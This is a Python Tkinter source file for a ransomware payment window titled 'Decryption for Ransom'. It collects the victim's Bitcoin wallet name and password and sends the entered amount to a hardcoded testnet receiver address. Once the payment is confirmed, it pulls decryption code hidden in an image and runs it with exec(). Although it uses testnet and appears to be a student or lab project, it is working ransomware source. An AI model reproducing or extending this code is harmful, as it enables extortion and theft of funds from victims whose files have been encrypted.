from tkinter import *

import bitcoinlib.transactions
from PIL import Image, ImageTk
from bitcoinlib.wallets import wallet_exists, wallet_create_or_open
from bitcoinlib.services.services import Service
from extract import extract_file


def clicking_submit():
    global round

    # Performs the model logic associated with opening a testnet wallet
    if round == 1:
        wallet_name: str = response_entry1.get()
        wallet_password: str = response_entry2.get()
        # TODO: Get rid of print statements in final product. Just for debugging purposes
        print(wallet_name)
        print(wallet_password)

        # If user provides input for an existing bitcoin wallet, moves on to next round
        if wallet_exists(wallet_name):
            global wallet
            # TODO: Password doesn't seem to matter as long as the wallet name is correct?
            wallet = wallet_create_or_open(wallet_name,
                                           password=wallet_password,
                                           network="testnet")
            print(f"Wallet Address: {wallet.get_key().address}")
            round += 1
            for widget in window.winfo_children():
                if widget != image_label:
                    widget.destroy()
            setup_round_2()

        else:
            wallet_exists_label = Label(window,
                                        text="Wallet not found! Verify the name of your bitcoin wallet.",
                                        fg="red")
            wallet_exists_label.pack(pady=2)

    elif round == 2:
        global amount_to_send

        amount_to_send = float(response_entry3.get())
        print(f"Amount to Send: {amount_to_send}")

        balance = float(wallet.balance())
        print(f"Wallet Balance: {balance}")

        if amount_to_send > balance:
            warning_label = Label(window, text="Insufficient funds! Add more testnet BTC to your wallet.", fg="red")
            warning_label.pack(pady=2)
        else:
            success_label = Label(window, text="Transaction valid! Initiating transaction now...", fg="green")
            success_label.pack(pady=2)

            round += 1

            # Transition to the next round
            for widget in window.winfo_children():
                if widget != image_label:
                    widget.destroy()
            setup_round_3()


def setup_round_1():
    global response_entry1, response_entry2, labels_and_entries_1

    name_label = Label(window, text="Name of Your Bitcoin Wallet", font=('Arial', 10, 'bold'))
    name_label.pack(pady=2)
    response_entry1 = Entry(window, width=30)
    response_entry1.pack(pady=5)

    password_label = Label(window, text="Password of Your Bitcoin Wallet", font=('Arial', 10, 'bold'))
    password_label.pack(pady=2)
    response_entry2 = Entry(window, width=30, show='*')
    response_entry2.pack(pady=5)

    submit_button = Button(window, text="Submit", command=clicking_submit, pady=4, borderwidth=2)
    submit_button.pack()

    labels_and_entries_1 = [name_label, response_entry1, password_label, response_entry2, submit_button]


def setup_round_2():
    global response_entry3, labels_and_entries_2

    wallet_address_label = Label(window, text=f"Your testnet wallet address: {wallet.get_key().address}",
                                 font=('Arial', 10, 'bold'))
    wallet_address_label.pack(pady=2)

    wallet_balance_label = Label(window,
                                 text=f"Current Balance: {wallet.balance()} tBTC",
                                 font=('Arial', 10, 'bold'),
                                 fg="green")
    wallet_balance_label.pack(pady=2)

    amount_bitcoin_to_send_label = Label(window,
                                         text="Enter the Amount of Bitcoins to Send",
                                         font=('Arial', 10, 'bold'))
    amount_bitcoin_to_send_label.pack(pady=2)

    response_entry3 = Entry(window, width=30)
    response_entry3.pack(pady=5)

    submit_button = Button(window,
                           text="Submit",
                           command=clicking_submit,
                           pady=4,
                           borderwidth=2)
    submit_button.pack()

    labels_and_entries_2 = [wallet_address_label, wallet_balance_label, amount_bitcoin_to_send_label, response_entry3,
                            submit_button]

def setup_round_3():
    # The address of my testnet bitcoin wallet
    #receiver_address: str = "tb1q502wsjnar03w82u56cxrn7yhrltc5w6kzxfrz9"
    receiver_address: str = "tb1q8fwk4r7tvt5zm6xc40ucd5mljesdj2jyt5hpea"
    wallet.utxos_update()
    try:
        # Carries out the transaction
        wallet_transaction = wallet.send_to(receiver_address, amount_to_send, network="testnet", fee=1000)
    except Exception as e:
        print(f"Transaction failed: {e}")
        return
    # Query transaction details
    try:
        service = Service(network="testnet")
        transaction_details = service.gettransaction(wallet_transaction.txid)

        if isinstance(transaction_details, bool):
            # The transaction was not found or failed
            print("Transaction details could not be retrieved. Please verify the transaction ID.")
            return

        if isinstance(transaction_details, bitcoinlib.transactions.Transaction):
            # Extract outputs and check if the transaction is successful
            print(f"Transaction retrieved successfully: {transaction_details}")
            for output in transaction_details.outputs:
                if output['address'] == receiver_address:
                    print(f"Transaction successful! Sent {amount_to_send} tBTC to {receiver_address}")

                    transaction_details_label = Label(text="Transaction successful", fg="blue")
                    transaction_details_label.pack()

                    successful_transaction_label = Label(
                        text="Decrypting your files now. Nice doing business with you. :)",
                        fg="green")
                    successful_transaction_label.pack()

                    import os
                    # Extracts the key from a specified image
                    with open("passphrase.txt", "r") as file:
                        lines = file.readlines()
                        passphrase = lines[0].strip("\n")

                    with open("images.txt", "r") as file:
                        lines = file.readlines()
                        image_containing_decryption_code: str = lines[3].strip("\n")

                    try:
                        decryption_code_found: bool = os.path.exists(image_containing_decryption_code)
                        if decryption_code_found:
                            code_to_decrypt_files: str = extract_file(image_containing_decryption_code, passphrase)
                            exec("import decrypt")
                            exec(f"{code_to_decrypt_files}")
                            print(f"\nTransaction Details: {transaction_details}")
                        else:
                            raise FileNotFoundError(
                                f"The image name/path {image_containing_decryption_code} doesn't exist in the current directory."
                                f"Either the name fed to the variable in the code to be updated or the image "
                                f"specified just doesn't exist.")
                    except FileNotFoundError as fnfe:
                        print(f"File Not Found: {fnfe}")
                        return
            print("Receiver address not found in transaction outputs.")
        else:
            print("Unexpected transaction details type returned.")
    except Exception as e:
        print(f"Failed to retrieve transaction details: {e}")


# Main Window Setup
window = Tk()
window.title("Decryption for Ransom")
image = Image.open("Popup.png")
resized_image = image.resize((673, 383))
photo = ImageTk.PhotoImage(resized_image)
image_label = Label(window, image=photo)
image_label.pack()
window.geometry("675x550")

icon_image = ImageTk.PhotoImage(file="icon.png")
window.iconphoto(False, icon_image)

# Initializes the round and displays widgets for first window frame
round = 1
setup_round_1()

window.mainloop()